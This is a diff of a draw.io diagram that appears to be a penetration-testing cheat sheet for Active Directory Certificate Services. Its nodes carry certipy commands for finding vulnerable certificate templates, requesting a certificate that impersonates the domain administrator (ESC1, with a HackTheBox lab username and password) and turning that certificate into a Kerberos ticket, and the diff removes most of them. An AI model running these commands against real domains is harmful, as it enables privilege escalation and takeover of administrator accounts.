@@ -1,4 +1,4 @@
-<mxfile host="app.diagrams.net" modified="2023-03-27T13:48:15.007Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="gV-QEzX4UXFR-gvNonTO" version="21.1.1" type="github" pages="6">
+<mxfile host="app.diagrams.net" modified="2023-03-27T13:48:47.020Z" agent="Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/111.0" etag="w0ZA4V0ePsbMldde8izA" version="21.1.1" type="github" pages="6">
   <diagram id="OxgtQte6AoLRu1fJhFKF" name="Reconnaissance">
     <mxGraphModel dx="3083" dy="882" grid="1" gridSize="10" guides="1" tooltips="1" connect="1" arrows="1" fold="1" page="1" pageScale="1" pageWidth="1169" pageHeight="827" math="0" shadow="0">
       <root>
@@ -275,12 +275,6 @@
         <mxCell id="rsNCh-QV2zhBNKZOqKP8-1" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="oLJrZAVxD-DevF4psgEO-1" target="oLJrZAVxD-DevF4psgEO-3" edge="1">
           <mxGeometry relative="1" as="geometry" />
         </mxCell>
-        <mxCell id="rsNCh-QV2zhBNKZOqKP8-2" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="oLJrZAVxD-DevF4psgEO-1" target="oLJrZAVxD-DevF4psgEO-4" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <mxCell id="rsNCh-QV2zhBNKZOqKP8-3" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="oLJrZAVxD-DevF4psgEO-1" target="oLJrZAVxD-DevF4psgEO-5" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
         <object label="&lt;div&gt;Check if ADCS vulnerable&lt;/div&gt;&lt;div&gt;&lt;br&gt;&lt;/div&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy.py&lt;/font&gt;" Commande="certipy find -u user@domain.local -p pass -dc-ip [ip] -vulnerable" id="oLJrZAVxD-DevF4psgEO-1">
           <mxCell style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
             <mxGeometry x="210" y="950" width="180" height="60" as="geometry" />
@@ -288,20 +282,6 @@
         </object>
         <mxCell id="oLJrZAVxD-DevF4psgEO-3" value="&lt;b&gt;ESC8&lt;/b&gt; : web enrollement is up" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
           <mxGeometry x="480" y="950" width="120" height="60" as="geometry" />
-        </mxCell>
-        <mxCell id="oLJrZAVxD-DevF4psgEO-7" style="edgeStyle=none;rounded=0;orthogonalLoop=1;jettySize=auto;html=1;exitX=1;exitY=0.5;exitDx=0;exitDy=0;entryX=0;entryY=0.5;entryDx=0;entryDy=0;" parent="1" source="oLJrZAVxD-DevF4psgEO-4" target="oLJrZAVxD-DevF4psgEO-6" edge="1">
-          <mxGeometry relative="1" as="geometry" />
-        </mxCell>
-        <object label="&lt;p id=&quot;adcs---esc1&quot;&gt;&lt;b&gt;ESC1: &lt;/b&gt;Impersonate user&lt;b&gt;&lt;br&gt;&lt;/b&gt;&lt;/p&gt;" Commande="certipy req -u Ryan.Cooper@sequel.htb -p &#39;NuclearMosquito3&#39; -target dc.sequel.htb -template UserAuthentication -ca sequel-DC-CA -upn administrator@sequel.htb" id="oLJrZAVxD-DevF4psgEO-4">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-            <mxGeometry x="480" y="1040" width="120" height="60" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="oLJrZAVxD-DevF4psgEO-5" value="" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="480" y="1130" width="120" height="60" as="geometry" />
-        </mxCell>
-        <mxCell id="oLJrZAVxD-DevF4psgEO-6" value="Get the certificate" style="rounded=1;whiteSpace=wrap;html=1;" parent="1" vertex="1">
-          <mxGeometry x="670" y="1040" width="120" height="60" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
@@ -560,14 +540,6 @@
         </object>
         <mxCell id="ZA79Oz3FYAEtSH71NLie-2" value="Get &quot;administrator&quot; certificate" style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
           <mxGeometry x="95" y="1630.25" width="120" height="60" as="geometry" />
-        </mxCell>
-        <object label="&lt;div&gt;Ask for a TGT with the certificate&lt;/div&gt;&lt;div&gt;&lt;code&gt;&lt;pre&gt;&lt;font color=&quot;#4a86e8&quot;&gt;certipy.py&lt;/font&gt;&lt;/pre&gt;&lt;/code&gt;&lt;/div&gt;" Commande="certipy auth -pfx administrator.pfx -dc-ip 192.168.56.12" Alternative="gettgtpkinit.py -pfx-base64 $(cat cert.b64) &#39;essos.local&#39;/&#39;meereen$&#39; &#39;meereen.ccache&#39;" id="ZA79Oz3FYAEtSH71NLie-3">
-          <mxCell style="rounded=1;whiteSpace=wrap;html=1;" vertex="1" parent="1">
-            <mxGeometry x="300" y="1624" width="160" height="72.5" as="geometry" />
-          </mxCell>
-        </object>
-        <mxCell id="ZA79Oz3FYAEtSH71NLie-4" value="&lt;div align=&quot;left&quot;&gt;If clock errors:&lt;br&gt;&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;-detect remote clock-skew : nmap -sV -sC 10.10.11.202&lt;/div&gt;&lt;div align=&quot;left&quot;&gt;- faketime&lt;br&gt; &lt;/div&gt;" style="rounded=1;whiteSpace=wrap;html=1;align=left;fillColor=#f0a30a;strokeColor=#BD7000;fontColor=#000000;" vertex="1" parent="1">
-          <mxGeometry x="300" y="1720.25" width="320" height="80" as="geometry" />
         </mxCell>
       </root>
     </mxGraphModel>
